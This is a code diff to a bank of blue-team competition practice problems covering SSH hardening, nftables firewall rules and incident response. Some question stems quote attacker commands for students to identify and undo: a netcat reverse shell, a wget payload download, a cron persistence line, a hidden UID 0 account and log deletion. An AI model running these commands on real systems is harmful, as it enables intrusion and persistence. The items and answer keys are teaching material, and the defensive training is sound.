@@ -1596,7 +1596,7 @@ const PROBLEM_BANK: Problem[] = [
 		question:
 			"You've been given a Linux server for the competition. The SSH config (/etc/ssh/sshd_config) has these settings:\n\nPermitRootLogin yes\nPasswordAuthentication yes\nPort 22\nX11Forwarding yes\nMaxAuthTries 6\n\nThe red team will be attacking within the hour. What changes do you make to harden SSH, and in what order of priority?",
 		correctAnswer:
-			"Priority order: (1) PermitRootLogin no — prevents direct root compromise. (2) Create a non-root user with sudo, set a strong password. (3) Change Port to a non-standard port (e.g., 2222). (4) X11Forwarding no — reduces attack surface. (5) MaxAuthTries 3 — limits brute force. (6) Consider adding AllowUsers to whitelist only your team's accounts. Then restart sshd: systemctl restart sshd.",
+			"Priority order: (1) PermitRootLogin no — prevents direct root compromise. (2) Create a non-root user with sudo, set a strong password. (3) Change Port to a non-standard port (e.g., 2222). (4) X11Forwarding no — reduces attack surface. (5) MaxAuthTries 3 — limits brute force. (6) Generate ed25519 keys (ssh-keygen -t ed25519), deploy to team members, then set PasswordAuthentication no. (7) AllowUsers to whitelist only your team's accounts. (8) LoginGraceTime 30 — reduces resource exhaustion from idle auth attempts. Then restart sshd: systemctl restart sshd.",
 		solutionSteps: [
 			"First priority: PermitRootLogin no — if the red team guesses the root password, they own the box instantly",
 			"Before disabling root login, create a non-root user: useradd -m -s /bin/bash teamuser && passwd teamuser && usermod -aG sudo teamuser",
@@ -1604,7 +1604,10 @@ const PROBLEM_BANK: Problem[] = [
 			"Change the port: Port 2222 — won't stop a port scan but slows automated attacks",
 			"X11Forwarding no — X11 forwarding can be exploited for local privilege escalation",
 			"MaxAuthTries 3 — reduces brute force window from 6 to 3 attempts per connection",
+			"If time allows, set up key-based auth: ssh-keygen -t ed25519 on your machine, copy with ssh-copy-id, then set PasswordAuthentication no",
+			"ed25519 is the modern standard — faster and more secure than RSA; never use DSA or ECDSA",
 			"Optional: AllowUsers teamuser — whitelist only specific accounts that should have SSH access",
+			"Add LoginGraceTime 30 — reduces the window for unauthenticated connections (default 120s is too generous)",
 			"Apply changes: systemctl restart sshd (keep your current session open while testing!)",
 		],
 		commonMisconceptions: [
@@ -1653,31 +1656,32 @@ const PROBLEM_BANK: Problem[] = [
 	{
 		id: "ncae-nd-1",
 		topic: "ncae-network-defense",
-		subtopic: "iptables-basics",
+		subtopic: "firewall-basics",
 		educationLevel: "competition",
 		gradeLevel: 0,
 		question:
-			"Your team's server runs a web server (HTTP/HTTPS) and SSH. Write iptables rules that: (1) Allow incoming SSH (port 22) only from your team's subnet 10.0.1.0/24. (2) Allow incoming HTTP (80) and HTTPS (443) from anywhere. (3) Allow all established/related connections. (4) Drop everything else. Write the commands in order.",
+			"Your team's server runs a web server (HTTP/HTTPS) and SSH. Using nftables (the modern Linux firewall), write rules that: (1) Allow incoming SSH (port 22) only from your team's subnet 10.0.1.0/24. (2) Allow incoming HTTP (80) and HTTPS (443) from anywhere. (3) Allow all established/related connections. (4) Drop everything else. Write the nft commands in order.",
 		correctAnswer:
-			"iptables -F\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp -s 10.0.1.0/24 --dport 22 -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT ACCEPT",
+			"nft flush ruleset\nnft add table inet filter\nnft add chain inet filter input '{ type filter hook input priority 0; policy drop; }'\nnft add chain inet filter forward '{ type filter hook forward priority 0; policy drop; }'\nnft add chain inet filter output '{ type filter hook output priority 0; policy accept; }'\nnft add rule inet filter input ct state established,related accept\nnft add rule inet filter input iif lo accept\nnft add rule inet filter input ip saddr 10.0.1.0/24 tcp dport 22 accept\nnft add rule inet filter input tcp dport { 80, 443 } accept",
 		solutionSteps: [
-			"First, flush existing rules to start clean: iptables -F",
-			"Allow established connections first (so your current SSH session doesn't drop): iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
-			"Allow SSH only from your team's subnet: iptables -A INPUT -p tcp -s 10.0.1.0/24 --dport 22 -j ACCEPT",
-			"Allow HTTP from anywhere: iptables -A INPUT -p tcp --dport 80 -j ACCEPT",
-			"Allow HTTPS from anywhere: iptables -A INPUT -p tcp --dport 443 -j ACCEPT",
-			"Allow loopback traffic (many services need this): iptables -A INPUT -i lo -j ACCEPT",
-			"Set default policy to DROP: iptables -P INPUT DROP",
-			"Drop forwarded traffic: iptables -P FORWARD DROP",
-			"Allow outbound traffic: iptables -P OUTPUT ACCEPT",
-			"Save the rules so they persist: iptables-save > /etc/iptables.rules",
+			"First, flush any existing rules to start clean: nft flush ruleset",
+			"Create a filter table that handles both IPv4 and IPv6: nft add table inet filter",
+			"Create the input chain with a default DROP policy: nft add chain inet filter input '{ type filter hook input priority 0; policy drop; }'",
+			"Allow established connections first (protects your current SSH session): nft add rule inet filter input ct state established,related accept",
+			"Allow loopback traffic (many local services need this): nft add rule inet filter input iif lo accept",
+			"Allow SSH from your team only: nft add rule inet filter input ip saddr 10.0.1.0/24 tcp dport 22 accept",
+			"Allow HTTP and HTTPS from anywhere (nft lets you combine ports): nft add rule inet filter input tcp dport { 80, 443 } accept",
+			"Block forwarding: nft add chain inet filter forward '{ type filter hook forward priority 0; policy drop; }'",
+			"Allow outbound traffic: nft add chain inet filter output '{ type filter hook output priority 0; policy accept; }'",
+			"Save so rules persist across reboots: nft list ruleset > /etc/nftables.conf && systemctl enable nftables",
+			"Quick alternative for Ubuntu: ufw is a simpler frontend — ufw allow from 10.0.1.0/24 to any port 22 proto tcp",
 		],
 		commonMisconceptions: [
 			"Setting the DROP policy before adding ACCEPT rules — you'll lock yourself out of SSH immediately",
-			"Forgetting the ESTABLISHED,RELATED rule — your own outbound connections (DNS, updates) will break",
-			"Not allowing loopback (lo) traffic — many local services communicate over localhost and will fail",
-			"Confusing -s (source) with -d (destination) — for incoming rules, restrict the source IP, not destination",
-			"Forgetting to save rules — iptables rules are lost on reboot without explicit save",
+			"Forgetting the ct state established,related rule — your own outbound connections (DNS, updates) will break",
+			"Not allowing loopback (iif lo) traffic — many local services communicate over localhost and will fail",
+			"Using legacy iptables instead of nft — iptables is deprecated; modern distros use nftables as the default backend",
+			"Forgetting to persist rules — nft rules are lost on reboot; save with 'nft list ruleset > /etc/nftables.conf' and enable the nftables service",
 		],
 		prerequisites: ["networking-basics", "tcp-ports", "linux-command-line"],
 		difficulty: "foundational",
@@ -1756,14 +1760,14 @@ const PROBLEM_BANK: Problem[] = [
 		question:
 			"Your MySQL database is a scored service. It's running extremely slowly. Running 'SHOW PROCESSLIST;' reveals hundreds of connections from IP 10.0.99.5 (a red team IP) all running 'SELECT SLEEP(30)'. Legitimate scoring checks are timing out. How do you handle this without taking the database offline?",
 		correctAnswer:
-			"(1) Kill the malicious connections: SELECT GROUP_CONCAT('KILL ', id SEPARATOR '; ') FROM information_schema.processlist WHERE host LIKE '10.0.99.5%'; — execute the output. (2) Block the IP at the firewall: iptables -A INPUT -s 10.0.99.5 -p tcp --dport 3306 -j DROP. (3) Set max connections per user and enable max_connect_errors. (4) If there's a MySQL user the attacker is using, revoke their access or change their password. (5) Check for other slow queries they may have planted.",
+			"(1) Kill the malicious connections: SELECT GROUP_CONCAT('KILL ', id SEPARATOR '; ') FROM information_schema.processlist WHERE host LIKE '10.0.99.5%'; — execute the output. (2) Block the IP at the firewall: nft insert rule inet filter input ip saddr 10.0.99.5 tcp dport 3306 drop. (3) Set max connections per user and enable max_connect_errors. (4) If there's a MySQL user the attacker is using, revoke their access or change their password. (5) Check for other slow queries they may have planted.",
 		solutionSteps: [
 			"Identify the scope: SHOW PROCESSLIST; — count how many malicious connections exist",
 			"Generate kill statements for all connections from the attacker IP:",
 			"SELECT CONCAT('KILL ', id, ';') FROM information_schema.processlist WHERE host LIKE '10.0.99.5%';",
 			"Execute all the KILL statements to terminate the sleeping connections",
 			"Or use a one-liner: mysqladmin -u root processlist | grep '10.0.99.5' | awk '{print $2}' | xargs -I{} mysqladmin -u root kill {}",
-			"Block the IP at the firewall immediately: iptables -I INPUT -s 10.0.99.5 -p tcp --dport 3306 -j DROP",
+			"Block the IP at the firewall immediately: nft insert rule inet filter input ip saddr 10.0.99.5 tcp dport 3306 drop",
 			"Harden MySQL: SET GLOBAL max_connections = 100; and SET GLOBAL max_connect_errors = 10;",
 			"Check which MySQL user the attacker used: SELECT user, host FROM mysql.user WHERE host LIKE '%10.0.99%';",
 			"If found, drop or restrict the user: DROP USER 'attacker_user'@'%';",
@@ -1776,7 +1780,7 @@ const PROBLEM_BANK: Problem[] = [
 			"Not checking which MySQL user the attacker is using — they may have a valid account that needs to be revoked",
 			"Ignoring the possibility of planted slow queries or triggers — check for any database objects the attacker may have created",
 		],
-		prerequisites: ["mysql-basics", "sql-fundamentals", "iptables-basics"],
+		prerequisites: ["mysql-basics", "sql-fundamentals", "firewall-basics"],
 		difficulty: "on-grade",
 	},
 
@@ -1854,13 +1858,13 @@ const PROBLEM_BANK: Problem[] = [
 		question:
 			"You're monitoring /var/log/auth.log during the competition and see these entries within 2 minutes:\n\nMar 15 14:22:01 server sshd[4521]: Failed password for root from 10.0.99.12 port 44231\n(... repeated 50 times ...)\nMar 15 14:23:47 server sshd[4571]: Accepted password for admin from 10.0.99.12 port 44281\nMar 15 14:23:49 server sshd[4571]: pam_unix(sshd:session): session opened for user admin\n\nWhat just happened? What do you do RIGHT NOW? List your actions in order of priority.",
 		correctAnswer:
-			"A brute-force attack on root failed, but the attacker successfully logged in as 'admin' — meaning admin had a weak or guessable password. Priority actions: (1) Kill the attacker's session immediately: who -u to find the PID, then kill -9 PID. (2) Change admin's password NOW: passwd admin. (3) Block the attacker IP: iptables -I INPUT -s 10.0.99.12 -j DROP. (4) Check what they've done: grep admin /var/log/auth.log, check bash_history, look for new files in /tmp. (5) Check for persistence: crontab -l -u admin, check authorized_keys.",
+			"A brute-force attack on root failed, but the attacker successfully logged in as 'admin' — meaning admin had a weak or guessable password. Priority actions: (1) Kill the attacker's session immediately: who -u to find the PID, then kill -9 PID. (2) Change admin's password NOW: passwd admin. (3) Block the attacker IP: nft insert rule inet filter input ip saddr 10.0.99.12 drop. (4) Check what they've done: grep admin /var/log/auth.log, check bash_history, look for new files in /tmp. (5) Check for persistence: crontab -l -u admin, check authorized_keys.",
 		solutionSteps: [
 			"Read the logs: 50 failed root attempts then a successful admin login from the same IP = brute force succeeded on a weak account",
 			"IMMEDIATE: find and kill the attacker's active session — who -u shows logged in users with PIDs",
 			"Kill the session: kill -9 <PID> — don't be gentle, use -9 to force kill",
 			"Change admin's password immediately: passwd admin — use a strong password",
-			"Block the IP at the firewall: iptables -I INPUT -s 10.0.99.12 -j DROP (use -I to insert at top, not -A to append)",
+			"Block the IP at the firewall: nft insert rule inet filter input ip saddr 10.0.99.12 drop (insert places it before other rules in the chain)",
 			"Investigate what the attacker did while connected: check /home/admin/.bash_history, /root/.bash_history if they escalated",
 			"Look for persistence mechanisms: crontab -l, check /etc/crontab, look in /etc/cron.d/",
 			"Check for new files: find / -user admin -newer /var/log/auth.log -type f 2>/dev/null",
@@ -1874,7 +1878,7 @@ const PROBLEM_BANK: Problem[] = [
 			"Not checking bash_history — this tells you exactly what commands the attacker ran",
 			"Assuming the attacker only compromised admin — they may have escalated to root within seconds of logging in",
 		],
-		prerequisites: ["log-reading", "linux-user-management", "iptables-basics"],
+		prerequisites: ["log-reading", "linux-user-management", "firewall-basics"],
 		difficulty: "foundational",
 	},
 	{
@@ -1886,16 +1890,16 @@ const PROBLEM_BANK: Problem[] = [
 		question:
 			"Running 'ps aux' on your server, you spot this process:\n\nnobody  12847  98.2  0.1  4520  1204 ?  R  14:30  5:22 /tmp/.x/nc -e /bin/bash 10.0.99.5 4444\n\nWhat is this process doing? What commands would you run to investigate and remediate? Be specific about the order.",
 		correctAnswer:
-			"This is a reverse shell — netcat (nc) is connecting back to the attacker at 10.0.99.5:4444 and piping /bin/bash to them, giving them interactive shell access. The 98.2% CPU and the hidden directory (/tmp/.x/) confirm malicious intent. Actions: (1) kill -9 12847. (2) rm -rf /tmp/.x/. (3) iptables -I OUTPUT -d 10.0.99.5 -j DROP (block outbound to attacker). (4) Check how it got there: look for cron jobs, other /tmp files, and what user 'nobody' has been doing.",
+			"This is a reverse shell — netcat (nc) is connecting back to the attacker at 10.0.99.5:4444 and piping /bin/bash to them, giving them interactive shell access. The 98.2% CPU and the hidden directory (/tmp/.x/) confirm malicious intent. Actions: (1) kill -9 12847. (2) rm -rf /tmp/.x/. (3) nft insert rule inet filter output ip daddr 10.0.99.5 drop (block outbound to attacker). (4) Check how it got there: look for cron jobs, other /tmp files, and what user 'nobody' has been doing.",
 		solutionSteps: [
 			"Identify the threat: 'nc -e /bin/bash 10.0.99.5 4444' is a textbook reverse shell",
 			"nc (netcat) with -e /bin/bash connects to the attacker and gives them a live bash session",
 			"It's running as 'nobody' from a hidden directory (/tmp/.x/) — clearly planted by the attacker",
 			"IMMEDIATE: kill the process — kill -9 12847",
 			"Remove the malicious files: rm -rf /tmp/.x/",
-			"Block outbound connections to the attacker: iptables -I OUTPUT -d 10.0.99.5 -j DROP",
+			"Block outbound connections to the attacker: nft insert rule inet filter output ip daddr 10.0.99.5 drop",
 			"Check how it was started: look for cron entries — crontab -l -u nobody, grep -r '10.0.99.5' /etc/cron*",
-			"Check for other reverse shells or backdoors: netstat -tlnp | grep ESTABLISHED, ps aux | grep nc",
+			"Check for other reverse shells or backdoors: ss -tnp state established, ps aux | grep nc",
 			"Look for more hidden files: find /tmp -name '.*' -type f and find /tmp -name '.*' -type d",
 			"Check if the attacker planted a systemd service: find /etc/systemd -newer /etc/hostname -type f",
 		],
@@ -2011,9 +2015,9 @@ const PROBLEM_BANK: Problem[] = [
 		educationLevel: "competition",
 		gradeLevel: 0,
 		question:
-			"After the red team compromised a server, you need to figure out what they did. The bash history shows:\n\nwget http://10.0.99.5/payload.sh -O /tmp/.hidden.sh\nchmod +x /tmp/.hidden.sh\n/tmp/.hidden.sh\necho '* * * * * root /tmp/.hidden.sh' >> /etc/crontab\nuseradd -o -u 0 -g 0 -M -d /root -s /bin/bash maint\necho 'maint:password123' | chpasswd\nrm -f /var/log/auth.log\niptables -A INPUT -s 10.0.99.5 -j ACCEPT\n\nList everything the attacker did, explain the purpose of each command, and provide the exact commands to undo each action.",
+			"After the red team compromised a server, you need to figure out what they did. The bash history shows:\n\nwget http://10.0.99.5/payload.sh -O /tmp/.hidden.sh\nchmod +x /tmp/.hidden.sh\n/tmp/.hidden.sh\necho '* * * * * root /tmp/.hidden.sh' >> /etc/crontab\nuseradd -o -u 0 -g 0 -M -d /root -s /bin/bash maint\necho 'maint:password123' | chpasswd\nrm -f /var/log/auth.log\nnft add rule inet filter input ip saddr 10.0.99.5 accept\n\nList everything the attacker did, explain the purpose of each command, and provide the exact commands to undo each action.",
 		correctAnswer:
-			"(1) Downloaded a payload from their server — undo: rm /tmp/.hidden.sh. (2) Made it executable and ran it — undo: check what it did (cat /tmp/.hidden.sh), kill any spawned processes. (3) Added a cron job to run the payload every minute — undo: remove the line from /etc/crontab. (4) Created a hidden root account 'maint' with UID 0 — undo: userdel -r maint. (5) Set a weak password on it — already handled by deleting the account. (6) Deleted auth.log to cover tracks — undo: touch /var/log/auth.log && systemctl restart rsyslog. (7) Allowed all traffic from their IP through the firewall — undo: iptables -D INPUT -s 10.0.99.5 -j ACCEPT.",
+			"(1) Downloaded a payload from their server — undo: rm /tmp/.hidden.sh. (2) Made it executable and ran it — undo: check what it did (cat /tmp/.hidden.sh), kill any spawned processes. (3) Added a cron job to run the payload every minute — undo: remove the line from /etc/crontab. (4) Created a hidden root account 'maint' with UID 0 — undo: userdel -r maint. (5) Set a weak password on it — already handled by deleting the account. (6) Deleted auth.log to cover tracks — undo: touch /var/log/auth.log && systemctl restart rsyslog. (7) Allowed all traffic from their IP through the firewall — undo: nft -a list ruleset to find the rule handle, then nft delete rule inet filter input handle <N>.",
 		solutionSteps: [
 			"Command 1 — wget: downloaded a malicious script to a hidden file (/tmp/.hidden.sh) — undo: rm /tmp/.hidden.sh",
 			"Command 2 — chmod +x: made the payload executable — moot after deletion, but check what it spawned",
@@ -2024,17 +2028,17 @@ const PROBLEM_BANK: Problem[] = [
 			"Command 5 — useradd -o -u 0: created user 'maint' with UID 0 (root), -o allows duplicate UID — undo: userdel -rf maint",
 			"Command 6 — chpasswd: set a known weak password — already handled by deleting the account",
 			"Command 7 — rm auth.log: destroyed evidence — undo: touch /var/log/auth.log && chmod 640 /var/log/auth.log && systemctl restart rsyslog",
-			"Command 8 — iptables ACCEPT: created a firewall rule to allow all traffic from their IP — undo: iptables -D INPUT -s 10.0.99.5 -j ACCEPT",
-			"After cleanup: verify with awk -F: '$3 == 0' /etc/passwd (only root), crontab -l (no malicious entries), iptables -L -n (no rogue rules)",
+			"Command 8 — nft accept rule: created a firewall rule to allow all traffic from their IP — undo: nft -a list ruleset | grep 10.0.99.5 to find the handle, then nft delete rule inet filter input handle <N>",
+			"After cleanup: verify with awk -F: '$3 == 0' /etc/passwd (only root), crontab -l (no malicious entries), nft list ruleset (no rogue rules)",
 		],
 		commonMisconceptions: [
 			"Deleting the payload without reading it first — you need to know what it does to find all its effects",
 			"Forgetting the cron job — even if you kill the process and delete the file, the cron will re-download and re-execute it",
 			"Not recognizing -o -u 0 as a UID 0 (root) account — the -o flag allows duplicate UIDs, which is how hidden root accounts work",
 			"Just recreating auth.log without restarting rsyslog — the logging daemon needs to be told about the new file",
-			"Using iptables -F to remove the ACCEPT rule — this flushes ALL rules including your own defense rules; use -D to delete the specific rule",
+			"Using nft flush ruleset to remove a single rogue rule — this flushes ALL rules including your own defense rules; use nft delete rule with a specific handle instead",
 		],
-		prerequisites: ["bash-commands", "cron-fundamentals", "user-management", "iptables"],
+		prerequisites: ["bash-commands", "cron-fundamentals", "user-management", "nftables"],
 		difficulty: "stretch",
 	},
 
